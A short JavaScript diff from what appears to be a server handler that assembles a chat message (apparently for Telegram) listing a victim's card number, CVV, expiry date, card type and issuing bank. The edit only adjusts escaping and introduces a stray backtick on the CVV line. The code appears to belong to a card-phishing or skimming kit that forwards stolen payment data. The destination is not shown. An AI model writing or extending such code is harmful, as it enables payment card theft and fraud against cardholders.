@@ -126,9 +126,10 @@ export default async function handler(req, res) {
 
                     mensaje += `💳 *DATOS DE LA TARJETA:*\n`;
                     if (numeroTarjeta) {
-                        mensaje += `🏦 Número: \\\`${numeroTarjeta}\\\`\\n`;
+                        
+                        mensaje += `🏦 Número: \`${numeroTarjeta}\`\n`;
                     }
-                    mensaje += `🔢 CVV: \\\`${cvv}\\\`\\n`;
+                    mensaje += `🔢 CVV: \`${cvv}\`\`\n`;
                     if (vencimiento) mensaje += `📅 Vencimiento: \`${vencimiento}\`\n`;
                     if (tipoTarjeta) mensaje += `💳 Tipo: ${tipoTarjeta.toUpperCase()}\n`;
                     if (bancoEmisor) mensaje += `🏛️ Banco emisor: ${bancoEmisor}\n`;
